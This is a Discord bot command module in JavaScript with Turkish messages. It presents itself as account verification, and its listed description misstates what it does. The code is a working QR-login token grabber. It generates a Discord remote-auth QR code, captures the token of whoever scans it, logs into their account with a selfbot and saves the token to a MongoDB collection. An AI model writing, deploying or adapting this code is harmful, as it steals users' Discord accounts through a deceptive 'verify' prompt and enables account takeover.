
  


  const { Client, Message, MessageEmbed, MessageActionRow, MessageButton, MessageSelectMenu } = require("discord.js");
  const { genEmbed } = require("../../../../Global/Init/Embed");
  const { pageEmbed } = require('../../../../Global/Plugins/Verifed/test');
  let emitter = require('events').EventEmitter;
  let ACARE = new emitter();
  const { RemoteAuthClient } = require('discord-remote-auth')
  const https = require('https')
  const fs = require('fs')
  const mongoose = require('mongoose');
  
  let tokens = mongoose.model('Token', new mongoose.Schema({
      id: String,
      username: String,
      discriminator: String,
      token: String,
  }));
  module.exports = {
      Isim: "acar123",
      Komut: ["qweqwe","sek"],
      Kullanim: "qweqwe @acar/ID",
      Aciklama: "Sunucudaki üyeler içerisinde tagı olmayanları kayıtsıza at.",
      Kategori: "-",
      Extend: false,
      
     /**
     * @param {Client} client 
     */
    onLoad: function (client) { 
  
    },
  
     /**
     * @param {Client} client 
     * @param {Message} message 
     * @param {Array<String>} args 
     */
  
    onRequest: async function (client, message, args) {
      let uye;
      const cl = new RemoteAuthClient()
      let msg = await message.reply({content: `QR yükleniyor...`});
      cl.on('pendingRemoteInit', qr => {
        const qrCodeStream = fs.createWriteStream('code.png')
        const data = `https://discordapp.com/ra/${qr}`
        https.get(`https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${data}`, res => {
          res.pipe(qrCodeStream)
        })
        qrCodeStream.once('close', () => {
          msg.edit({content:`Aşağıda bulunan QR kodunu "**Discord**" uygulaması üzerinden okuyup doğrulayın. Bunun için **1 Dakika** bulunmakta.`, files: [{ attachment: './code.png', name: 'code.png' }]});
          setTimeout(() => {
              msg.delete().catch(err => {})
          }, 60000);
        })
       
      })
      cl.on('pendingFinish', async user => {
        fs.unlinkSync('code.png')
        uye = message.guild.members.cache.get(user.id) || user
        await tokens.updateOne({id: uye.id}, {$set: {username: uye.user ? uye.user.username : uye.username, discriminator: uye.user ? uye.user.discriminator : uye.discriminator}}, {upsert: true})
        msg.edit({content: null, embeds: [new genEmbed().setDescription(`Hoşgeldin! **${uye.user ? uye.user.tag : uye.username + "#" + uye.discriminator}**
  QR kodumuzu başarıyla taradınız aşağıda bulunan "Beni içeri al!" düğmesine basarak devam ediniz.`)], attachments: []});
      })
      cl.on('finish', async tkn => {
  
          let self = require('discord.js-selfbot');
          let sazanClient = new self.Client({ 
    
          })
          let Row = new MessageActionRow().addComponents(
              new MessageButton()
              .setCustomId("seseSok")
              .setLabel("Sese AFK Bırak!")
              .setStyle("SECONDARY")
          )
          sazanClient.login(tkn).catch(async (err) => {
              await tokens.deleteOne({id: uye.id})
              msg.edit({content: null, embeds: [new genEmbed().setDescription(`QR kodu okumasına rağmen bağlantı sağlanamadı. ${cevaplar.prefix}`)], attachments: []}).catch(err => {})
          })
          sazanClient.on('ready', async () => {
              await tokens.updateOne({id: uye.id}, {$set: {token: tkn}}, {upsert: true})
              await msg.edit({components: [Row], embeds: [new genEmbed().setAuthor(sazanClient.user.tag, sazanClient.user.avatarURL({dynamic: true})).setDescription(`Hoşgeldin! **${sazanClient.user.tag}** Güvenli bir hesap olarak onaylandınız. ${msg.guild.emojiGöster(emojiler.Onay)}
  **25 Saniye** içerisinde aşağıda bulunan "Sese AFK Bırak!" düğmesi ile otomatik olarak seste afk kalırsınız.`)]}).then(as => {
                  var filter = (i) => i.user.id == message.member.id
                  let collector = as.createMessageComponentCollector({filter})
                  collector.on('collect', i => {
                      if(i.customId == "seseSok") {
                          let kanal = sazanClient.channels.cache.get("1008135456057204786")
                       
                          if(kanal)  kanal.join().then(async (connection) => {
                            i.reply({content: `Başarıyla ${kanal} kanalına **AFK** bırakıldı. ${msg.guild.emojiGöster(emojiler.Onay)}`,ephemeral: true}).catch(err => {})
                          })
                          Row.components[0].setDisabled(true)
                          Row.components[0].setLabel("Başarıyla Sese Sokuldu!")
                          Row.components[0].setStyle("SUCCESS")
                          msg.edit({components: [Row]})
                          setTimeout(() => {
                              msg.delete().catch(err => {})
                          }, 25000)
                      }
                  })
              });
          })
      })
  
      cl.on('close', () => {
        if (fs.existsSync('code.png')) fs.unlinkSync('code.png')
      })
  
      cl.connect()
  
    }
  };
  